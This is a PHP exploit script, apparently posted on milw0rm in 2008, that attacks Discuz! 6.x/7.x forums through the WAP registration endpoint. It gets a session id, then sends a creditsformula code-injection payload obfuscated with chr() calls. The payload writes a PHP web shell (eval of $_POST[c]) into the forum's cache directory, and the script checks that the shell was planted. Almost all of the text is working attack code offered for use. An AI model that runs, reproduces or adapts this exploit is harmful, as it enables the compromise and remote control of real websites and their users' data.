#!/usr/bin/php
<?php
/**
 * Discuz! 6.x/7.x SODB-2008-13 Exp
 * By www.80vul.com
 * 文件中注释的变量值请自行修改
 */
$host = 'www.80vul.com';
// 服务器域名或IP
$path = '/discuz/';
// 程序所在的路径
$key  = 0;
// 上面的变量编辑好后，请将此处的值改为1

if (strpos($host, '://') !== false || strpos($path, '/') === false || $key !== 1)
     exit("专业点好不,先看看里面的注释 -,-\n");

error_reporting(7);
ini_set('max_execution_time', 0);

$key = time();
$cmd = 'action=register&username='.$key.'&password='.$key.'&email='.$key.'@80vul.com&_DCACHE=1';
$resp = send();

preg_match('/logout=yes&amp;formhash=[a-z0-9]{8}&amp;sid=([a-zA-Z0-9]{6})/', $resp, $sid);

if (!$sid)
    exit("哦,大概是没有开启WAP注册吧 -,-\n");

$cmd = 'stylejump[1]=1&styleid=1&inajax=1&transsidstatus=1&sid='.$sid[1].'&creditsformula=${${fputs(fopen(chr(46).chr(46).chr(47).chr(102).chr(111).chr(114).chr(117).chr(109).chr(100).chr(97).chr(116).chr(97).chr(47).chr(99).chr(97).chr(99).chr(104).chr(101).chr(47).chr(101).chr(118).chr(97).chr(108).chr(46).chr(112).chr(104).chr(112),chr(119).chr(43)),chr(60).chr(63).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(99).chr(93).chr(41).chr(63).chr(62).chr(56).chr(48).chr(118).chr(117).chr(108))}}';
send();

$shell = 'http://'.$host.$path.'forumdata/cache/eval.php';

if (file_get_contents($shell) == '80vul')
    exit("好了,去看看你的WebShell吧:\t$shell\n里面的代码是:\t<?eval(\$_POST[c])?>\n别告诉我你不会用 -,-\n");
else
    exit("嗯,大概是该网站不存在漏洞,换一个吧 -,-\n");

function send()
{
    global $host, $path, $url, $cmd;

    $data = "POST ".$path."wap/index.php  HTTP/1.1\r\n";
    $data .= "Accept: */*\r\n";
    $data .= "Accept-Language: zh-cn\r\n";
    $data .= "Referer: http://$host$path\r\n";
    $data .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $data .= "User-Agent: Opera/9.62 (X11; Linux i686; U; zh-cn) Presto/2.1.1\r\n";
    $data .= "Host: $host\r\n";
    $data .= "Connection: Close\r\n";
    $data .= "Content-Length: ".strlen($cmd)."\r\n\r\n";
    $data .= $cmd;

    $fp = fsockopen($host, 80);
    fputs($fp, $data);

    $resp = '';

    while ($fp && !feof($fp))
        $resp .= fread($fp, 1024);

    return $resp;
}

?>

# milw0rm.com [2008-11-14]
